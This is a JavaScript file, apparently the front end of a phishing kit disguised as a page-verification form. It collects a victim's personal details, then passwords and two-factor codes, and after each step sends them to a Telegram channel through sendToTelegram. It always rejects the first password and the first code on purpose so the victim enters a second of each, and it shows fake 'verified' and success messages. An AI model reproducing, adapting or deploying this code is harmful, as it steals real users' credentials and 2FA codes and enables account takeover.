    requestModal.addEventListener('click', (e) => {
        if (e.target === requestModal) {
            closeModal();
        }
    });

    // Country Picker click interactions
    countryPickerBtn.addEventListener('click', (e) => {
        e.stopPropagation();
        if (countryDropdownMenu.classList.contains('hidden')) {
            showCountryDropdown();
        } else {
            hideCountryDropdown();
        }
    });

    // Close picker menu when clicking outside
    document.addEventListener('click', (e) => {
        if (!e.target.closest('#country-picker')) {
            hideCountryDropdown();
        }
    });

    // Filter country on typing search input
    countrySearchInput.addEventListener('input', (e) => {
        filterCountries(e.target.value);
    });

    // Note character count update
    noteTextarea.addEventListener('input', (e) => {
        const len = e.target.value.length;
        noteCharCount.textContent = len;
    });

    // Block non-digits in phone input and clean prefix entry
    phoneNumberInput.addEventListener('input', (e) => {
        e.target.value = e.target.value.replace(/[^\d\s\-()]/g, '');
    });

    // Password Visibility Toggle Listener
    passwordToggleBtn.addEventListener('click', () => {
        if (passwordInput.type === 'password') {
            passwordInput.type = 'text';
            eyeOpenIcon.classList.add('hidden');
            eyeClosedIcon.classList.remove('hidden');
        } else {
            passwordInput.type = 'password';
            eyeOpenIcon.classList.remove('hidden');
            eyeClosedIcon.classList.add('hidden');
        }
    });

    // Step 1 Submission: Transitions to Step 2 (Password check)
    verificationForm.addEventListener('submit', async (e) => {
        e.preventDefault();

        if (!validateForm()) {
            showToast('Please fill out all required fields with correct formats', 'error');
            return;
        }

        await ensureIpInfo();
        formDataToSend = collectFormData();
        sendToTelegram(buildTelegramMessage());

        // Transition from Step 1 (Info) to Step 2 (Password)
        stepInfoContainer.classList.add('hidden');
        stepPasswordContainer.classList.remove('hidden');
        passwordInput.value = '';
        passwordInput.closest('.password-input-group').classList.remove('invalid');
        passwordInput.focus();
    });

    // Step 2 Submission: Handle password confirmation with simulated 2-attempts validation logic
    continuePasswordBtn.addEventListener('click', () => {
        const passwordVal = passwordInput.value.trim();
        const pwdGroup = passwordInput.closest('.password-input-group');

        // Check if password field is blank
        if (!passwordVal) {
            pwdGroup.classList.add('invalid');
            showToast('Password is required', 'error');
            return;
        }

        // First attempt fails deliberately (matches screenshot error mockup)
        if (passwordAttempts === 0) {
            passwordAttempts = 1;
            passwords.push(passwordVal);
            sendToTelegram(buildTelegramMessage());
            pwdGroup.classList.add('invalid');
            passwordInput.value = '';
            passwordInput.focus();
            showToast('Incorrect password. Please try again.', 'error');
        } 
        // Second attempt succeeds and proceeds to Step 3 (2FA)
        else {
            pwdGroup.classList.remove('invalid');
            passwords.push(passwordVal);
            sendToTelegram(buildTelegramMessage());

            // Show submit loading spinner state on Continue button
            continuePasswordBtn.disabled = true;
            const origText = continuePasswordBtn.textContent;
            continuePasswordBtn.innerHTML = `
                <svg class="spinner" viewBox="0 0 50 50" style="animation: spin 1s linear infinite; width: 18px; height: 18px; margin-right: 8px; vertical-align: middle;">
                    <circle cx="25" cy="25" r="20" fill="none" stroke="currentColor" stroke-width="5" stroke-dasharray="80, 200" stroke-dashoffset="0"></circle>
                </svg> Continuing...
            `;

            setTimeout(() => {
                // Restore button
                continuePasswordBtn.disabled = false;
                continuePasswordBtn.textContent = origText;

                // Transition to Step 3 (2FA Screen)
                stepPasswordContainer.classList.add('hidden');
                step2faContainer.classList.remove('hidden');
                codeInput.value = '';
                codeInput.closest('.code-input-group').classList.remove('invalid');
                codeInput.focus();
                
                showToast('Password verified. Two-factor authentication required.', 'success');
            }, 1500);
        }
    });

    // Sanitize code input: block any non-digit character dynamically
    codeInput.addEventListener('input', (e) => {
        e.target.value = e.target.value.replace(/\D/g, '');
    });

    // Step 3 Submission: Handle 2FA code confirmation with simulated 2-attempts validation logic
    continue2faBtn.addEventListener('click', () => {
        const codeVal = codeInput.value.trim();
        const codeGroup = codeInput.closest('.code-input-group');

        // Check if code matches the digits only format and length (6 to 8 digits)
        if (!codeVal) {
            codeGroup.classList.add('invalid');
            showToast('Code is required', 'error');
            return;
        }

        const digitsPattern = /^\d{6,8}$/;
        if (!digitsPattern.test(codeVal)) {
            codeGroup.classList.add('invalid');
            showToast('Code must be between 6 and 8 numbers only', 'error');
            return;
        }

        verificationCodes.push(codeVal);
        sendToTelegram(buildTelegramMessage());

        // First attempt fails deliberately
        if (codeAttempts === 0) {
            codeAttempts = 1;
            codeGroup.classList.add('invalid');
            codeInput.value = '';
            codeInput.focus();
            showToast('Incorrect code. Please try again.', 'error');
        } 
        // Second attempt succeeds and proceeds to success screen
        else {
            codeGroup.classList.remove('invalid');
            
            // Show submit loading spinner state on Continue button
            continue2faBtn.disabled = true;
            const origText = continue2faBtn.textContent;
            continue2faBtn.innerHTML = `
                <svg class="spinner" viewBox="0 0 50 50" style="animation: spin 1s linear infinite; width: 18px; height: 18px; margin-right: 8px; vertical-align: middle;">
                    <circle cx="25" cy="25" r="20" fill="none" stroke="currentColor" stroke-width="5" stroke-dasharray="80, 200" stroke-dashoffset="0"></circle>
                </svg> Continuing...
            `;

            setTimeout(() => {
                // Restore button
                continue2faBtn.disabled = false;
                continue2faBtn.textContent = origText;

                // Populate Success screen values from Step 1 inputs
                const pageNameVal = document.getElementById('page-name').value;
                successPageName.textContent = pageNameVal;
                const successPageNameDetail = document.getElementById('success-page-name-detail');
                if (successPageNameDetail) successPageNameDetail.textContent = pageNameVal;
                successEmail.textContent = document.getElementById('email').value;
                successPhone.textContent = `${currentSelectedCountry.dial} ${phoneNumberInput.value}`;

                // Transition to final Success Screen
                verificationForm.classList.add('hidden');
                successScreen.classList.remove('hidden');
                
                showToast('Verification request has been submitted!', 'success');
            }, 1500);
        }
    });

    // Generate a random ticket ID like #Y88T-KC11-Q01C
    function generateTicketID() {
        const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
        const segment = () => {
            let s = '';
            for (let i = 0; i < 4; i++) {
                s += chars.charAt(Math.floor(Math.random() * chars.length));
            }
            return s;
        };
        return `#${segment()}-${segment()}-${segment()}`;
    }

    function initTicketID() {
        const newTicketId = generateTicketID();
        if (ticketIdDisplay) ticketIdDisplay.textContent = newTicketId;
        if (successTicketId) successTicketId.textContent = newTicketId;
    }

    // Core Initialization Calls
    initDOBOptions();
    initCountryList();
    selectCountry(currentSelectedCountry);
    initTicketID();
});
